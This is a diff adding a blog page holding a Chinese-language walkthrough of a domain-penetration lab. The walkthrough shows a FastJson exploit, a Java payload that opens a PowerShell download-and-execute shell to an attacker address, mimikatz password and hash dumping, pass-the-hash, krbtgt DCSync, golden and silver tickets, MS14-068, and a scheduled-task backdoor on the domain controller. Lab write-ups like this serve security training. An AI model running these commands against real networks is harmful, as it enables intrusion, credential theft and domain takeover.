@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>域靶场WP ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">域靶场WP</h1>
+        <p class="text-center"><b>Friday, April 10th 2020, 4:31 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <p>域环境利用已有靶场，简单方便<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<p>web环境漏洞FastJson。利用<a href="https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE</a> 修改而来</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114455.png" alt="image-20200407153757538"></p>
+<p>参数为json字符串，可以简单的使用如下探测是否存在问题。</p>
+<pre><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}
+</code></pre><p>比如，此处使用burp的DNS监听</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114500.png" alt="image-20200407140108169"></p>
+<p>执行后会发现，说明存在问题。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114502.png" alt="image-20200407140121264"></p>
+<p>至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。</p>
+<p>此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。</p>
+<pre><code>import java.lang.Runtime;
+import java.lang.Process;
+
+public class Exploit {
+    public Exploit(){
+        try{
+            // Runtime.getRuntime().exec(&quot;/bin/bash -i &gt;&amp;/dev/tcp/192.168.120.130/8888&lt;&amp;1&quot;);
+            Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#39;http://192.168.120.130:80/a\&#39;))\&quot;&quot;);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
+</code></pre><p>执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114504.png" alt="image-20200408095902201"></p>
+<p>利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。</p>
+<pre><code>mimikatz sekurlsa::logonpasswords
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114506.png" alt="image-20200408134439940"></p>
+<p>不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114508.png" alt="image-20200408151440720"></p>
+<p>如果提示报错，尝试修改注册表</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre><p>收集信息可知以下信息</p>
+<pre><code>域名：DC.de1ay.com
+域主机：10.10.10.10
+域用户：Administrator，delay,mssql
+域管理员：Administrator
+两个网卡：192.168.120.0/24，10.10.10.0/24
+主机：存在两个主机(192.168.120.201，10.10.10.10)
+存在360主机防御系统，不过并没有干涉
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114510.png" alt="image-20200408100546410"></p>
+<p>尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。</p>
+<p>使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114512.png" alt="image-20200408155334127"></p>
+<p>然后利用net共享，先用mimikatz生成pth凭据。</p>
+<pre><code>sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327
+</code></pre><p>net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问</p>
+<pre><code>pth DE1AY\de1ay 161cff084477fe596a5db81874498a24
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114514.png" alt="image-20200408163645027"></p>
+<p>再尝试利用金票，直接登陆到主机上，上传mimikatz执行。</p>
+<pre><code>lsadump::dcsync /domain:de1ay.com /user:krbtgt
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114515.png" alt="image-20200409164051760"></p>
+<p>得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi  </p>
+<pre><code>kerberos::golden /admin:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:golden.kiribi
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114517.png" alt="image-20200409164616356"></p>
+<p>通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 </p>
+<pre><code>kerberos::purge   //删除票据
+kerberos::ptt golden.kiribi  //导入票据
+kerberos::list  //查看票据
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114519.png" alt="image-20200409164906689"></p>
+<p>查看DC域主机默认共享，可以连接到域主机，上传文件执行。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114520.png" alt="image-20200409165120018"></p>
+<p>先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114522.png" alt="image-20200409172526385"></p>
+<p>或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114524.png" alt="image-20200409172758964"></p>
+<p>利用<code>copy beacon.exe \\DC.de1ay.com\c$\Users\de1ay\</code>到DC主机上</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114526.png" alt="image-20200409170358135"></p>
+<p>创建计划任务执行后门，很快就有DC主机上线了。</p>
+<pre><code>schtasks /create /s DC.de1ay.com /ru &quot;SYSTEM&quot; /tn testdc /sc DAILY /tr C:\\Users\\de1ay\\beacon.exe /F
+schtasks /run /s DC.de1ay.com /tn testdc /i
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114527.png" alt="image-20200409173044533"></p>
+<p>对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114529.png" alt="image-20200409174013572"></p>
+<p>最后就可以获得shell。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114530.png" alt="image-20200409174748884"></p>
+<p>再尝试使用银票，生成前删除全部票据，不能访问。</p>
+<pre><code>klist purge
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114532.png" alt="image-20200410090753302"></p>
+<p>这里使用de1ay的hash</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114534.png" alt="image-20200410091300403"></p>
+<pre><code>kerberos::golden /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /target:DC.de1ay.org /service:cifs /rc4:161cff084477fe596a5db81874498a24 /user:de1ay /ptt
+</code></pre><p>这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114536.png" alt="image-20200410091815717"></p>
+<p>查看是否可以访问</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114538.png" alt="image-20200410091924771"></p>
+<p>同样shell以后可以看到是个用户权限</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114540.png" alt="image-20200410092340435"></p>
+<p>在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据</p>
+<p>由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件</p>
+<p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
+<pre><code>ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com
+</code></pre><p>生成cache缓存文件，再使用mimikatz来导入</p>
+<pre><code>kerberos::ptc TGT_de1ay@de1ay.com.ccache
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114542.png" alt="image-20200410100442974"></p>
+<p>不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114544.png" alt="image-20200410113800119"></p>
+<p>执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。</p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/04/域靶场WP/">/2020/04/域靶场WP/</a>
+                    <p>发表日期：<a href="/2020/04/域靶场WP/">April 10th 2020, 4:31:54 pm</a>
+                    <p>更新日期：<a href="/2020/04/域靶场WP/">April 10th 2020, 4:32:09 pm</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;渗透测试</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/04/域靶场WP/'; 
+            this.page.identifier = '/2020/04/域靶场WP/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
